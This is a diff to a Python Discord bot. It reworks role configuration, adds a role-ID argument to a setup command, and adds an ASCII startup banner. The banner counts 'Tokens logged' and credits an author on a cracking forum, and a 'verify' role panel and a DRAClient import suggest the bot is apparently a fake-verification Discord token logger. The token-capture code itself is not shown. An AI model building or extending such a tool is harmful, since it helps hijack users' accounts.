@@ -1,5 +1,7 @@
+from tkinter.ttk import Style
 import discord
 import asyncio
+import os
 
 from discord_webhook import DiscordEmbed
 from DRAclient import DRAClient
@@ -11,6 +13,8 @@ from discord import HTTPException, app_commands
 from config import config
 from colorama import init
 from colorama import Fore
+from colorama import Style
+
 from discord.utils import get
 from datetime import datetime
 
@@ -33,7 +37,9 @@ class Dropdown(discord.ui.Select):
 
     async def callback(self, interaction: discord.Interaction):
         role_id = get(self.guild.roles, name=self.values[0]).id
-        config['servers'] = {self.guild.id: {'verify_role': role_id}}
+
+        config['servers'][self.guild.id] = {'verify_role': role_id}
+        config.write()
         await interaction.message.delete()
 
 
@@ -69,10 +75,15 @@ class PersistentViewBot(commands.Bot):
         self.add_view(PersistentView())
 
     async def on_ready(self):
-        print('X==================||==================X')
-
-        print(f'Logged in as {self.user} (ID: {self.user.id})')
-        print('X==================||==================X')
+        os.system('cls')
+        print(f"""
+██████  ██ ███████  ██████      {Style.BRIGHT}Username: {Style.DIM}{self.user}
+██   ██ ██ ██      ██    ██     {Style.BRIGHT}ID: {Style.DIM}{self.user.id}
+██   ██ ██ ███████ ██    ██     {Style.BRIGHT}Guilds: {Style.DIM}{len(self.guilds)}
+██   ██ ██      ██ ██ ▄▄ ██     {Style.BRIGHT}Tokens logged: {Style.DIM}{config['tokens_logged']}
+██████  ██ ███████  ██████      {Style.BRIGHT}Author: {Style.DIM}https://cracked.io/hotrod
+                       ▀▀                               
+        """)
 
 
 bot = PersistentViewBot()
@@ -91,9 +102,18 @@ async def setuppanel(ctx: commands.Context):
 
 @bot.command()
 @commands.has_permissions(administrator=True)
-async def setuprole(ctx: commands.Context):
-    message = await ctx.send(view=DropdownView(ctx.guild))
+async def setuprole(ctx: commands.Context, arg1=None):
 
+    if arg1 != None:
+        config['servers'][ctx.guild.id] = {'verify_role': arg1}
+        config.write()
+        return
+    try:
+        await ctx.send(view=DropdownView(ctx.guild))
+    except:
+        await ctx.send("Error: more than 25 roles. Pass in role id as argument")
+
+print(f'{Fore.WHITE}[{datetime.now()}] [INFO] Logging into bot...')
 
 try:
     bot.run(config['bot_token'])
